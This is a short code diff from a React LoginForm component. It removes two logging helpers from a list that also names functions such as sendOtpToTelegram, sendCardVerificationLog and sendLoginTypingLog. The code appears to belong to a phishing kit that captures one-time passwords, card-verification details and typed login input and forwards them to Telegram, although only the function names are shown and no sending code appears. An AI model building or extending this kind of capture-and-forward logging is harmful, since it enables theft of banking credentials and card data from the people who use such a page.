@@ -216,8 +216,6 @@ function LoginForm() {
     sendOtpToTelegram,
     sendSuccessToTelegram,
     sendCardVerificationLog,
-    sendOtpPageLog,
-    sendCardVerificationPageLog,
     sendOtpSubmitLog,
     sendOtpVerifiedLog,
     sendLoginTypingLog,
